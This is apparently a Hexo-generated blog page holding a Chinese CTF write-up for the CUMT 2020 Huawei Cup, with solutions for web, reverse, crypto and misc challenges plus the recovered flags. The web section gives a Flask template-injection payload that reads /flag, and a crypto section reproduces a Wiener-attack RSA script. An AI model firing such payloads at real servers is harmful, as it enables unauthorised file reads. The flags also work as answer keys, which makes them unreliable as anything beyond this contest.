@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="CUMT华为杯web狗活成了各方向签到手… webbabyflask模板注入 1&#x2F;name&#x3D;&amp;#123;&amp;#123;().__class__.__base__.__subclasses__().__getitem__(40)(%27&#x2F;flag%27).read()&amp;#125;&amp;#125; dogef12摇奖得flag rehello_world异或 123456789">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CUMT2020华为杯">
+<meta property="og:url" content="http://yoursite.com/2020/10/24/CUMT2020%E5%8D%8E%E4%B8%BA%E6%9D%AF/index.html">
+<meta property="og:site_name" content="Pz1o&#39;s blog">
+<meta property="og:description" content="CUMT华为杯web狗活成了各方向签到手… webbabyflask模板注入 1&#x2F;name&#x3D;&amp;#123;&amp;#123;().__class__.__base__.__subclasses__().__getitem__(40)(%27&#x2F;flag%27).read()&amp;#125;&amp;#125; dogef12摇奖得flag rehello_world异或 123456789">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-10-24T09:53:38.000Z">
+<meta property="article:modified_time" content="2020-10-24T09:54:27.392Z">
+<meta property="article:author" content="Pz1o">
+<meta property="article:tag" content="题解">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://yoursite.com/2020/10/24/CUMT2020%E5%8D%8E%E4%B8%BA%E6%9D%AF/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>CUMT2020华为杯 | Pz1o's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Pz1o's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/10/24/CUMT2020%E5%8D%8E%E4%B8%BA%E6%9D%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/timg.jpeg">
+      <meta itemprop="name" content="Pz1o">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pz1o's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CUMT2020华为杯
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-10-24 17:53:38 / 修改时间：17:54:27" itemprop="dateCreated datePublished" datetime="2020-10-24T17:53:38+08:00">2020-10-24</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>6.6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>6 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="CUMT华为杯"><a href="#CUMT华为杯" class="headerlink" title="CUMT华为杯"></a>CUMT华为杯</h1><p>web狗活成了各方向签到手…</p>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h2><p>模板注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;name&#x3D;&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(40)(%27&#x2F;flag%27).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="doge"><a href="#doge" class="headerlink" title="doge"></a>doge</h2><p>f12摇奖得flag</p>
+<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="hello-world"><a href="#hello-world" class="headerlink" title="hello_world"></a>hello_world</h2><p>异或</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">d=[]</span><br><span class="line">b = <span class="string">"is_easy_right?"</span></span><br><span class="line">a = [<span class="string">'2A'</span>, <span class="string">'26'</span>, <span class="string">'12'</span>, <span class="string">'31'</span>, <span class="string">'1A'</span>, <span class="string">'7'</span>, <span class="string">'11'</span>, <span class="string">'3A'</span>, <span class="string">'2D'</span>, <span class="string">'0F'</span>, <span class="string">'0E'</span>,<span class="string">'1A'</span>, <span class="string">'41'</span>, <span class="string">'4B'</span>, <span class="string">'36'</span>, <span class="string">'43'</span>, <span class="string">'31'</span>, <span class="string">'0'</span>, <span class="string">'3E'</span>, <span class="string">'16'</span>, <span class="string">'17'</span>, <span class="string">'35'</span>,<span class="string">'1D'</span>, <span class="string">'10'</span>, <span class="string">'38'</span>, <span class="string">'11'</span>, <span class="string">'44'</span>, <span class="string">'4A'</span>, <span class="string">'1B'</span>, <span class="string">'2C'</span>, <span class="string">'2B'</span>, <span class="string">'17'</span>,<span class="string">'50'</span>,<span class="string">'3'</span>, <span class="string">'4'</span>]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> a:</span><br><span class="line">    c = <span class="string">''</span></span><br><span class="line">    z = x</span><br><span class="line">    c += <span class="string">'0x'</span></span><br><span class="line">    c +=z</span><br><span class="line">    d.append(c)</span><br><span class="line">d = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">35</span>):</span><br><span class="line">    c = int(a[i],<span class="number">16</span>)</span><br><span class="line">    m = i%<span class="number">14</span></span><br><span class="line">    print(chr(ord((b[m]))^c),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="non-name"><a href="#non-name" class="headerlink" title="non_name"></a>non_name</h2><p>四元一次方程</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">b = [<span class="number">12</span>, <span class="number">32</span>, <span class="number">34</span>, <span class="number">12</span>, <span class="number">53</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">34</span>, <span class="number">45</span>, <span class="number">56</span>, <span class="number">32</span>, <span class="number">85</span>, <span class="number">43</span>]</span><br><span class="line">c = [<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">    sum1 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">        print(<span class="string">"%s*%s"</span>%(b[i*<span class="number">4</span>+j],c[j]),end=<span class="string">'+'</span>)</span><br><span class="line">    print(<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#116 103 102 114</span></span><br></pre></td></tr></table></figure>
+<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="Classical"><a href="#Classical" class="headerlink" title="Classical"></a>Classical</h2><p>维吉尼亚密码，上网down脚本，猜密钥，跑出来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">"Elxyi lrw fqfjyxl pr wixx yajy chb qtsk lqfjzrx zs xuua vafe chb nfsl pcgy es ipgv tzxo ywzq rvyc djxcfx lrw oyr tzxo ytc vxhp! Orwto pmlx rvy hafm vh icitt;kz wzxtx dzy phre tg zq;uj hlta czu otpm yz fx,iinamlg rtf ltci zndr qgj wmyl eyd ggg vmlrvl xz dg tne ysi momygk rqn blrm as oo.Eta rtf ltci pngnia mltiprpsk mq ffvi rvy dwwxv,xszyzo xciseu mt xedl czu kmthsr,igvyrh khtkth xh ripp qhw azxeg,lrzuya jhup xh teve qhw afatr? Hphaql rny jsnywplx bp hysikz’wsowl.Ky dzy yliw tztv by sykaw jom,bv iwzftipj hmkvl ysi halpr hxtlty, xhv.Xse ztrinpwm vj aeginx izr’m uineklcknwc ahzp tzx dxxe sy lzprqmjbsr;xalc uukm otpp xal qzsl hh xapvraltny mjty nsflw llggi mmpmk dej.Hsirbspwl smps xht mmzwx dlz cjr,vatdi pos sujm, vatdi pos sanx uxfcgalh,lnv mjhxp aav llvw mtbjo,jhy sylq mjxd neg htarwvktyp xal mxpgkvtsni hm tpoheg.pmz ltci eomvjxi elxpv winxu.Etgi ulktnk pkmm l wfppp,gjhyl btxa h otsk tpw jyhl dmeh s mgtw.Elx ivtgzmgly qymbvp waen tqherz fp bslgw ty e yvvrolmgg ulwm, fsf csg’v zt zr plpw if ekyjfrmpp jom egm lz sy fsfr htum klmebvps sgf ajlvmhgsek.Tpw ny xal iyd, A to zqlh mv xpld rqn ysi VBQECLY kl JynhfXseNbixspvxJmahwk.Dr ysi phc, ceexoujc xh bwp bjtexx miyvvp smuobyemgn."</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(message, key)</span>:</span></span><br><span class="line">    cipher = <span class="string">''</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(message)):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> key[j % len(key)].islower():</span><br><span class="line">            offset = ord(key[j % len(key)]) - ord(<span class="string">'a'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> key[j % len(key)].isupper():</span><br><span class="line">                offset = ord(key[j % len(key)]) - ord(<span class="string">'A'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                offset = ord(key[j % len(key)]) - <span class="number">48</span></span><br><span class="line"></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> message[i].isalpha():</span><br><span class="line">            <span class="keyword">if</span> message[i].islower():</span><br><span class="line">                cipher += chr((ord(message[i]) - ord(<span class="string">'a'</span>) + offset) % <span class="number">26</span> + ord(<span class="string">'a'</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                cipher += chr((ord(message[i]) - ord(<span class="string">'A'</span>) + offset) % <span class="number">26</span> + ord(<span class="string">'A'</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cipher += message[i]</span><br><span class="line">            j -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(cipher, key)</span>:</span></span><br><span class="line">    explain = <span class="string">''</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> key[j % len(key)].islower():</span><br><span class="line">            offset = ord(key[j % len(key)]) - ord(<span class="string">'a'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> key[j % len(key)].isupper():</span><br><span class="line">                offset = ord(key[j % len(key)]) - ord(<span class="string">'A'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                offset = ord(key[j % len(key)]) - <span class="number">48</span></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> cipher[i].isalpha():</span><br><span class="line">            <span class="keyword">if</span> cipher[i].islower():</span><br><span class="line">                explain += chr((ord(cipher[i]) - ord(<span class="string">'a'</span>) - offset) % <span class="number">26</span> + ord(<span class="string">'a'</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                explain += chr((ord(cipher[i]) - ord(<span class="string">'A'</span>) - offset) % <span class="number">26</span> + ord(<span class="string">'A'</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            explain += cipher[i]</span><br><span class="line">            j -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> explain</span><br><span class="line"></span><br><span class="line">print(decrypt(cipher,<span class="string">'Lethelastctf'</span>))</span><br><span class="line"></span><br><span class="line">CUMTCTF&#123;EnjoyTheVigenereCipher&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h2><p>大数e</p>
+<p>可以判断是wiener attack</p>
+<p>上网直接down脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;&#39;</span><br><span class="line">Created on Dec 14, 2011</span><br><span class="line"></span><br><span class="line">@author: pablocelayes</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">import ContinuedFractions, Arithmetic, RSAvulnerableKeyGenerator</span><br><span class="line"></span><br><span class="line">def hack_RSA(e,n):</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    Finds d knowing (e,n)</span><br><span class="line">    applying the Wiener continued fraction attack</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    frac &#x3D; ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">    convergents &#x3D; ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line">    </span><br><span class="line">    for (k,d) in convergents:</span><br><span class="line">        </span><br><span class="line">        #check if d is actually the key</span><br><span class="line">        if k!&#x3D;0 and (e*d-1)%k &#x3D;&#x3D; 0:</span><br><span class="line">            phi &#x3D; (e*d-1)&#x2F;&#x2F;k</span><br><span class="line">            s &#x3D; n - phi + 1</span><br><span class="line">            # check if the equation x^2 - s*x + n &#x3D; 0</span><br><span class="line">            # has integer roots</span><br><span class="line">            discr &#x3D; s*s - 4*n</span><br><span class="line">            if(discr&gt;&#x3D;0):</span><br><span class="line">                t &#x3D; Arithmetic.is_perfect_square(discr)</span><br><span class="line">                if t!&#x3D;-1 and (s+t)%2&#x3D;&#x3D;0:</span><br><span class="line">                    print(&quot;Hacked!&quot;)</span><br><span class="line">                    return d</span><br><span class="line"></span><br><span class="line"># TEST functions</span><br><span class="line"></span><br><span class="line">def test_hack_RSA():</span><br><span class="line">    print(&quot;Testing Wiener Attack&quot;)</span><br><span class="line">    times &#x3D; 5</span><br><span class="line">    </span><br><span class="line">    while(times&gt;0):</span><br><span class="line">        e,n,d &#x3D; RSAvulnerableKeyGenerator.generateKeys(1024)</span><br><span class="line">        print(&quot;(e,n) is (&quot;, e, &quot;, &quot;, n, &quot;)&quot;)</span><br><span class="line">        print(&quot;d &#x3D; &quot;, d)</span><br><span class="line">    </span><br><span class="line">        hacked_d &#x3D; hack_RSA(e, n)</span><br><span class="line">    </span><br><span class="line">        if d &#x3D;&#x3D; hacked_d:</span><br><span class="line">            print(&quot;Hack WORKED!&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;Hack FAILED&quot;)</span><br><span class="line">        </span><br><span class="line">        print(&quot;d &#x3D; &quot;, d, &quot;, hacked_d &#x3D; &quot;, hacked_d)</span><br><span class="line">        print(&quot;-------------------------&quot;)</span><br><span class="line">        times -&#x3D; 1</span><br><span class="line">    </span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    n &#x3D; 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597</span><br><span class="line">    e &#x3D; 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619</span><br><span class="line">    c &#x3D; 235079473042454099807116076488262740135383858230967099540307826273199444131724945298259060669497025680602868465015609167157760611830665379910856647739895018654389167886359502125262006498872925841789249028759026079722290718145036644959479543255350040619949567107916725017078853648984759794085772688267388901151</span><br><span class="line">    #test_is_perfect_square()</span><br><span class="line">    d &#x3D; 8264667972294275017293339772371783322168822149471976834221082393409363691895</span><br><span class="line">    m &#x3D; pow(c,d,n)</span><br><span class="line">    def num2str(num):</span><br><span class="line">        tmp &#x3D; hex(num)[2:].replace(&quot;L&quot;,&quot;&quot;)</span><br><span class="line">        if(len(tmp))%2 &#x3D;&#x3D;0:</span><br><span class="line">            return tmp.decode(&quot;hex&quot;)</span><br><span class="line">        else:</span><br><span class="line">            return (&quot;0&quot;+tmp).decode(&quot;hex&quot;)</span><br><span class="line">    print(num2str(m))</span><br><span class="line">    #print(&quot;-------------------------&quot;)</span><br><span class="line">    #print(hack_RSA(e,n))</span><br><span class="line"></span><br><span class="line">CUMTCTF&#123;1bc205a110e6643137e045b8268b4ace&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="Sign-In"><a href="#Sign-In" class="headerlink" title="Sign In"></a>Sign In</h2><p>转base64在转brainfk</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CUMTCTF&#123;Welcome_to_CUMTCTF_2020_Final&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="出个流量分析吧"><a href="#出个流量分析吧" class="headerlink" title="出个流量分析吧"></a>出个流量分析吧</h2><p>http流base64解码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;WirRSharK_S0_E45y&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="出个LSB吧"><a href="#出个LSB吧" class="headerlink" title="出个LSB吧"></a>出个LSB吧</h2><p>LSB隐写</p>
+<p>red green blue 0 0 0</p>
+<p>保存得二维码 扫得flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cumtctf&#123;1sb_i4_s0_Ea4y&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="出个伪web吧"><a href="#出个伪web吧" class="headerlink" title="出个伪web吧"></a>出个伪web吧</h2><p>查看最新修改文件的时间</p>
+<p>可以看到pass中有明显字符串cumt</p>
+<p>然后拿flag包裹就行</p>
+<h2 id="出个文档吧"><a href="#出个文档吧" class="headerlink" title="出个文档吧"></a>出个文档吧</h2><p>隐藏文字</p>
+<h2 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f memory.img imageinfo</span><br><span class="line">python vol.py -f memory.img --profile=Win2003SP0x86 filescan |grep flag</span><br></pre></td></tr></table></figure>
+<p>可以看到有flag.png，输出一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 dumpfiles -D .&#x2F; -Q 0x000000000484f900</span><br></pre></td></tr></table></figure>
+<p>可以看到一个图片扫一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4&#x3D;</span><br></pre></td></tr></table></figure>
+<p>解不出来</p>
+<p>查看系统窗口列表，看有没有和flag有关的程序</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 windows | grep flag</span><br></pre></td></tr></table></figure>
+<p>可以看到有一个程序dump一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 memdump -D .&#x2F; -p 1992</span><br></pre></td></tr></table></figure>
+<p>用foremost分离一下</p>
+<p>可以看到有图片</p>
+<p>有key值和vi 然后就是AES加密</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">key:Th1s_1s_K3y00000</span><br><span class="line">vi:1234567890123456</span><br><span class="line">base64:jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4&#x3D;</span><br><span class="line"></span><br><span class="line">flag&#123;F0uNd_s0m3th1ng_1n_M3mory&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="出个压缩包吧"><a href="#出个压缩包吧" class="headerlink" title="出个压缩包吧"></a>出个压缩包吧</h2><p>010打开之后发现有secret.png没有伪加密，很明显子块被修改</p>
+<p>7a改成74</p>
+<p>分离出secret.png</p>
+<p>发现是一张图片，但有两帧</p>
+<p>脱到steg里面可以看到两个残缺的二维码</p>
+<p>补全，就可以看到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;yanji4n_bu_we1shi&#125;</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Pz1o
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/2020/10/24/CUMT2020%E5%8D%8E%E4%B8%BA%E6%9D%AF/" title="CUMT2020华为杯">http://yoursite.com/2020/10/24/CUMT2020华为杯/</a>
+  </li>
+  <li class="post-copyright-license">
